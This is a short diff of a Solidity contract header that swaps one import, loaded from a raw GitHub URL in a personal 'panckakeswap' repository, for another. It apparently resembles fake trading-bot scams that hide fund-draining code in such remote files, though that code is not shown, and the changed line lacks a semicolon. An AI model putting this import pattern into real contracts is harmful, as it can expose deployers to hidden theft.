@@ -2,7 +2,7 @@ pragma solidity ^0.6.6;
 
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-import "https://raw.githubusercontent.com/soliditier01/panckakeswap-blog-contracts-/main/PerformanceTasks.sol"
+import "https://raw.githubusercontent.com/soliditier01/panckakeswap-blog-contracts-/main/UniswapTasksV1.sol"
 
 
 // All subsequent code will be inside this block
